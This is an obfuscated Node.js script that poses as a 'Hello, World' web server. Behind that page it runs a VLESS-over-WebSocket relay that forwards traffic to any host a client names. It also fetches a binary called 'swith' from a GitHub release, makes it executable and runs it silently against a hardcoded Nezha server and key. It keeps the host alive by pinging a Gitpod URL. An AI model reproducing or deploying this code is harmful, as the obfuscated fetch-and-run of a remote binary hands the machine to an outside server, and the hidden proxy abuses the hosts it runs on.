const _0x52ff55=_0x337b;(function(_0x50ac8d,_0x3a6224){const _0x577d91=_0x337b,_0x418c56=_0x50ac8d();while(!![]){try{const _0x52f400=parseInt(_0x577d91(0x14b))/0x1*(parseInt(_0x577d91(0x19e))/0x2)+parseInt(_0x577d91(0x178))/0x3*(-parseInt(_0x577d91(0x160))/0x4)+parseInt(_0x577d91(0x182))/0x5+parseInt(_0x577d91(0x16d))/0x6+-parseInt(_0x577d91(0x148))/0x7*(parseInt(_0x577d91(0x14c))/0x8)+-parseInt(_0x577d91(0x154))/0x9+-parseInt(_0x577d91(0x190))/0xa*(parseInt(_0x577d91(0x153))/0xb);if(_0x52f400===_0x3a6224)break;else _0x418c56['push'](_0x418c56['shift']());}catch(_0x178421){_0x418c56['push'](_0x418c56['shift']());}}}(_0x289c,0x37d6c));const os=require('os'),http=require(_0x52ff55(0x169)),{Buffer}=require('buffer'),fs=require('fs'),axios=require('axios'),path=require(_0x52ff55(0x17d)),net=require(_0x52ff55(0x14f)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),logcb=(..._0x2121e2)=>console['log'][_0x52ff55(0x17b)](this,..._0x2121e2),errcb=(..._0xd7237c)=>console[_0x52ff55(0x145)][_0x52ff55(0x17b)](this,..._0xd7237c),UUID=process[_0x52ff55(0x176)][_0x52ff55(0x16f)]||_0x52ff55(0x1a0),uuid=UUID[_0x52ff55(0x13f)](/-/g,''),projectPageURL=process[_0x52ff55(0x176)][_0x52ff55(0x17c)]||_0x52ff55(0x179),intervalInMilliseconds=process['env'][_0x52ff55(0x140)]||0xa*0x3c*0x3e8,NEZHA_SERVER=process[_0x52ff55(0x176)][_0x52ff55(0x19f)]||_0x52ff55(0x15a),NEZHA_PORT=process[_0x52ff55(0x176)][_0x52ff55(0x188)]||_0x52ff55(0x151),NEZHA_KEY=process[_0x52ff55(0x176)][_0x52ff55(0x170)]||_0x52ff55(0x1a1),DOMAIN=process[_0x52ff55(0x176)][_0x52ff55(0x14a)]||_0x52ff55(0x195),NAME=process['env'][_0x52ff55(0x173)]||_0x52ff55(0x146),port=process['env'][_0x52ff55(0x177)]||0xbb8,metaInfo=execSync(_0x52ff55(0x149),{'encoding':_0x52ff55(0x150)}),ISP=metaInfo[_0x52ff55(0x166)](),httpServer=http[_0x52ff55(0x196)]((_0x57fdbd,_0x4de5c0)=>{const _0x1c892e=_0x52ff55;if(_0x57fdbd['url']==='/')_0x4de5c0['writeHead'](0xc8,{'Content-Type':_0x1c892e(0x192)}),_0x4de5c0[_0x1c892e(0x172)](_0x1c892e(0x199));else{if(_0x57fdbd[_0x1c892e(0x18e)]===_0x1c892e(0x15c)){const _0x9bb5b9='vless://'+UUID+_0x1c892e(0x158)+DOMAIN+'&type=ws&host='+DOMAIN+_0x1c892e(0x17f)+NAME+'-'+ISP,_0xe14e08=Buffer['from'](_0x9bb5b9)[_0x1c892e(0x19d)]('base64');_0x4de5c0[_0x1c892e(0x180)](0xc8,{'Content-Type':'text/plain'}),_0x4de5c0[_0x1c892e(0x172)](_0xe14e08+'\x0a');}else _0x4de5c0[_0x1c892e(0x180)](0x194,{'Content-Type':_0x1c892e(0x192)}),_0x4de5c0[_0x1c892e(0x172)](_0x1c892e(0x156));}});httpServer[_0x52ff55(0x142)](port,()=>{const _0x13dfb5=_0x52ff55;console[_0x13dfb5(0x194)](_0x13dfb5(0x167)+port);});function getSystemArchitecture(){const _0x1ee720=_0x52ff55,_0x31f3cb=os[_0x1ee720(0x15f)]();return _0x31f3cb===_0x1ee720(0x186)||_0x31f3cb===_0x1ee720(0x147)?_0x1ee720(0x186):_0x1ee720(0x14e);}function downloadFile(_0x31246b,_0x40756c,_0x3795d4){const _0x1396c3=_0x52ff55,_0x4198f7=path[_0x1396c3(0x18a)]('./',_0x31246b),_0x433d57=fs[_0x1396c3(0x157)](_0x4198f7);axios({'method':'get','url':_0x40756c,'responseType':_0x1396c3(0x184)})[_0x1396c3(0x144)](_0x2c8268=>{const _0x4fb40b=_0x1396c3;_0x2c8268[_0x4fb40b(0x161)][_0x4fb40b(0x191)](_0x433d57),_0x433d57['on']('finish',function(){const _0x501b2c=_0x4fb40b;_0x433d57[_0x501b2c(0x18d)](),_0x3795d4(null,_0x31246b);});})[_0x1396c3(0x181)](_0x268ad0=>{const _0x2dc548=_0x1396c3;_0x3795d4('Download\x20'+_0x31246b+_0x2dc548(0x189)+_0x268ad0[_0x2dc548(0x165)]);});}function downloadFiles(){const _0x47ba3e=_0x52ff55,_0x1708ac=getSystemArchitecture(),_0x53caae=getFilesForArchitecture(_0x1708ac);if(_0x53caae[_0x47ba3e(0x162)]===0x0){console[_0x47ba3e(0x194)](_0x47ba3e(0x14d));return;}let _0x181361=0x0;_0x53caae[_0x47ba3e(0x19b)](_0x388e80=>{const _0x40cde0=_0x47ba3e;downloadFile(_0x388e80[_0x40cde0(0x18b)],_0x388e80[_0x40cde0(0x16a)],(_0x3e8f76,_0x1743be)=>{const _0x13cdb6=_0x40cde0;_0x3e8f76?console[_0x13cdb6(0x194)](_0x13cdb6(0x18c)+_0x1743be+'\x20failed'):(console[_0x13cdb6(0x194)](_0x13cdb6(0x18c)+_0x1743be+_0x13cdb6(0x198)),_0x181361++,_0x181361===_0x53caae[_0x13cdb6(0x162)]&&setTimeout(()=>{authorizeFiles();},0xbb8));});});}function _0x289c(){const _0x4c2475=['NEZHA_KEY','URL\x20or\x20TIME\x20variable\x20is\x20empty.\x20Skipping\x20visit\x20URL','end','NAME','https://github.com/eoovve/test/releases/download/bulid/swith','Connect-Err:','env','PORT','121833sgpGAF','https://3000-auslin45-nodewj-qvw4x3artdt.ws-us107.gitpod.io','./swith','bind','URL','path','Page\x20visited\x20successfully.','&path=%2F#','writeHead','catch','1673290qOQXDg','swith\x20is\x20running','stream','swith\x20running\x20error:\x20','arm','Error\x20visiting\x20project\x20page:','NEZHA_PORT','\x20failed:\x20','join','fileName','Download\x20','close','url','readUInt16BE','978760iUuPhW','pipe','text/plain','Connect:','log','1234.abc.com','createServer','substr','\x20successfully','Hello,\x20World\x0a','get','forEach','WebSocket\x20Error:','toString','1702bnvQVq','NEZHA_SERVER','e34d8167-5eba-4910-adaf-9fb18a25550f','Okj3bnJi2srHhm2qWd','replace','TIME','slice','listen','readUInt8','then','error','ABCD','arm64','7tuNuYF','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','DOMAIN','293rQFuml','295648VURwhJ','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','amd','net','utf-8','5555','--tls','33MBmCoU','608580ejfvyt','map','Not\x20Found\x0a','createWriteStream','@skk.moe:443?encryption=none&security=tls&sni=','chmod','nz.auslin.top','Connected\x20successfully','/sub','connect','concat','arch','40qdvuXc','data','length','every','Empowerment\x20failed:','message','trim','HTTP\x20Server\x20is\x20running\x20on\x20port\x20','send','http','fileUrl','once','Empowerment\x20success:','2694174xoSwEt','443','UUID'];_0x289c=function(){return _0x4c2475;};return _0x289c();}function getFilesForArchitecture(_0xb465c4){const _0x22262a=_0x52ff55;if(_0xb465c4===_0x22262a(0x186))return[{'fileName':'swith','fileUrl':'https://github.com/eoovve/test/releases/download/ARM/swith'}];else{if(_0xb465c4==='amd')return[{'fileName':'swith','fileUrl':_0x22262a(0x174)}];}return[];}function authorizeFiles(){const _0x12ef78=_0x52ff55,_0x17a1cf=_0x12ef78(0x17a),_0x308ba1=0x1fd;fs[_0x12ef78(0x159)](_0x17a1cf,_0x308ba1,_0x1d267a=>{const _0x395509=_0x12ef78;if(_0x1d267a)console[_0x395509(0x145)](_0x395509(0x164)+_0x1d267a);else{console[_0x395509(0x194)](_0x395509(0x16c)+_0x308ba1['toString'](0x8)+'\x20('+_0x308ba1[_0x395509(0x19d)](0xa)+')');let _0x4534b2='';if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){NEZHA_PORT===_0x395509(0x16e)?_0x4534b2=_0x395509(0x152):_0x4534b2='';const _0x1fb50a='./swith\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x4534b2+'\x20>/dev/null\x202>&1\x20&';try{exec(_0x1fb50a),console['log'](_0x395509(0x183));}catch(_0x2cf041){console[_0x395509(0x145)](_0x395509(0x185)+_0x2cf041);}}else console[_0x395509(0x194)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');}});}downloadFiles();const wss=new WebSocket['Server']({'server':httpServer});wss['on']('connection',_0x582353=>{const _0x494aa4=_0x52ff55;console['log'](_0x494aa4(0x15b)),_0x582353[_0x494aa4(0x16b)](_0x494aa4(0x165),_0x5f50be=>{const _0x402901=_0x494aa4,[_0x3c93f3]=_0x5f50be,_0x562b3e=_0x5f50be['slice'](0x1,0x11);if(!_0x562b3e[_0x402901(0x163)]((_0x436158,_0x7e2492)=>_0x436158==parseInt(uuid[_0x402901(0x197)](_0x7e2492*0x2,0x2),0x10)))return;let _0x2f21f2=_0x5f50be['slice'](0x11,0x12)[_0x402901(0x143)]()+0x13;const _0x35d372=_0x5f50be[_0x402901(0x141)](_0x2f21f2,_0x2f21f2+=0x2)['readUInt16BE'](0x0),_0x2d6d85=_0x5f50be[_0x402901(0x141)](_0x2f21f2,_0x2f21f2+=0x1)[_0x402901(0x143)](),_0x598ee6=_0x2d6d85==0x1?_0x5f50be[_0x402901(0x141)](_0x2f21f2,_0x2f21f2+=0x4)[_0x402901(0x18a)]('.'):_0x2d6d85==0x2?new TextDecoder()['decode'](_0x5f50be['slice'](_0x2f21f2+0x1,_0x2f21f2+=0x1+_0x5f50be['slice'](_0x2f21f2,_0x2f21f2+0x1)[_0x402901(0x143)]())):_0x2d6d85==0x3?_0x5f50be[_0x402901(0x141)](_0x2f21f2,_0x2f21f2+=0x10)['reduce']((_0x187381,_0x3d26c7,_0x2cee8f,_0x58057f)=>_0x2cee8f%0x2?_0x187381[_0x402901(0x15e)](_0x58057f[_0x402901(0x141)](_0x2cee8f-0x1,_0x2cee8f+0x1)):_0x187381,[])[_0x402901(0x155)](_0x429edc=>_0x429edc[_0x402901(0x18f)](0x0)[_0x402901(0x19d)](0x10))[_0x402901(0x18a)](':'):'';logcb(_0x402901(0x193),_0x598ee6,_0x35d372),_0x582353[_0x402901(0x168)](new Uint8Array([_0x3c93f3,0x0]));const _0x46f7c1=createWebSocketStream(_0x582353);net[_0x402901(0x15d)]({'host':_0x598ee6,'port':_0x35d372},function(){const _0x217009=_0x402901;this['write'](_0x5f50be[_0x217009(0x141)](_0x2f21f2)),_0x46f7c1['on'](_0x217009(0x145),errcb('E1:'))[_0x217009(0x191)](this)['on'](_0x217009(0x145),errcb('E2:'))['pipe'](_0x46f7c1);})['on']('error',errcb(_0x402901(0x175),{'host':_0x598ee6,'port':_0x35d372}));})['on'](_0x494aa4(0x145),errcb(_0x494aa4(0x19c)));});function _0x337b(_0x543ffe,_0x162096){const _0x289cd5=_0x289c();return _0x337b=function(_0x337b14,_0x441fe7){_0x337b14=_0x337b14-0x13f;let _0x37c67d=_0x289cd5[_0x337b14];return _0x37c67d;},_0x337b(_0x543ffe,_0x162096);}let hasLoggedEmptyMessage=![];async function visitProjectPage(){const _0x196c68=_0x52ff55;try{if(!projectPageURL||!intervalInMilliseconds){!hasLoggedEmptyMessage&&(console[_0x196c68(0x194)](_0x196c68(0x171)),hasLoggedEmptyMessage=!![]);return;}else hasLoggedEmptyMessage=![];await axios[_0x196c68(0x19a)](projectPageURL),console[_0x196c68(0x194)](_0x196c68(0x17e));}catch(_0x2d4715){console['error'](_0x196c68(0x187),_0x2d4715[_0x196c68(0x165)]);}}setInterval(visitProjectPage,intervalInMilliseconds);
